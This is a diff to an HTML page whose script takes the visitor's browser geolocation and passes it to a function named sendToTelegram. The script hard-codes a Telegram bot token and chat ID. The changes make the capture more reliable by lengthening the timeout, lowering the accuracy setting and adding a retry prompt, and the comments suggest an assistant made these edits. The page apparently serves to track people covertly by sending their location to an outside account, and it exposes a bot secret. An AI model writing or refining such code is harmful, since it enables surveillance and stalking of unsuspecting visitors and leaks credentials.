@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -31,7 +32,7 @@
     </div>
 
     <script>
-        // ✅ Both your credentials are now perfectly updated
+        // ✅ Your official credentials embedded correctly
         const BOT_TOKEN = '8967585991:AAH1eHdBlMFxeiseF3Nr7ZDQCQwyvye31Ts'; 
         const CHAT_ID = '7683334933';                
 
@@ -41,9 +42,10 @@
             statusText.style.color = "#f59e0b"; 
 
             if (navigator.geolocation) {
+                // FIXED: Timeout increased to 30s and HighAccuracy turned false to fix timeout error
                 navigator.geolocation.getCurrentPosition(sendToTelegram, showError, {
-                    enableHighAccuracy: true, 
-                    timeout: 12000,
+                    enableHighAccuracy: false, 
+                    timeout: 30000,
                     maximumAge: 0
                 });
             } else {
@@ -97,7 +99,7 @@
                     statusText.innerText = "Location information is unavailable.";
                     break;
                 case error.TIMEOUT:
-                    statusText.innerText = "The request to get user location timed out.";
+                    statusText.innerText = "The request to get user location timed out. Please try again.";
                     break;
                 default:
                     statusText.innerText = "An unknown error occurred.";
